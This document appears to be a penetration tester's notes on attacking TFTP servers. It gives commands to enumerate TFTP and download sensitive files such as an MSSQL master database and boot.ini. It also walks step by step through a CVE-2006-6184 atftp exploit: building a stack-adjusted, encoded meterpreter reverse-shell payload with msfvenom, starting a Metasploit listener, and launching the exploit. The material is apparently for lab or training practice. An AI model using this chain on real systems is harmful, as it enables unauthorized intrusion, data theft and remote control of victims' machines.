
```bash - kali
sudo nmap -sU -p69 --script tftp-enum $TARGET
```

#### tftp.py

```bash - kali
pip install tftpy
```

```python - kali
import tftpy
client = tftpy.TftpClient("$KALI", 69)
client.download("C:\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf", "/home/kali/Desktop/$TARGET/master.mdf", timeout=5)

#client.upload("filename to upload", "/local/path/file", timeout=5)
```

#### atftp
```bash - kali
sudo apt install atftp
```

```bash - kali
atftp -g -r "C:\boot.ini" $TARGET
```

If you are after a path that has spaces, try using [[Abbreviated dir]]'s.

https://github.com/shauntdergrigorian/cve-2006-6184/blob/master/atftp.py

==READ THE EXPLOIT STEPS VERY CAREFULLY!!==

1.) Enter the following to create a hex file of the amount that needs to be subtracted from the stack pointer (3500):
```bash - kali
perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
```

2.) Next, use the following command to create a staged meterpreter shell payload:
```bash - kali
msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=[your IP] LPORT=[your port] R > payload
```

3.) Then, combine the two files you just created.
```bash - kali
cat stackadj payload > shellcode
```

4.) Finally, let's eliminate the bad characters.
```bash - kali
msfvenom -p generic/custom PAYLOADFILE=./shellcode -b "\x00" -e x86/shikata_ga_nai -f python
```

Enter the output as the value of the "payload" variable. You may need to run this exploit a few times for it to work.

![[Pasted image 20220406211356.png | 1200]]

#### Metasploit Listener

```bash - kali
sudo msfdb run
```

```bash - kali
use exploit/multi/handler
```

```bash - kali
set PAYLOAD windows/meterpreter/reverse_nonx_tcp
```

```bash - kali
set ExitOnSession false
```

```bash - kali
set AutoRunScript post/windows/manage/migrate
```

```bash - kali
set lhost
```

```bash - kali
set lport
```

```bash - kali
exploit -j
```

```bash - kali
python atftp.py $TARGET 69 $KALI $OS-VERSION
```
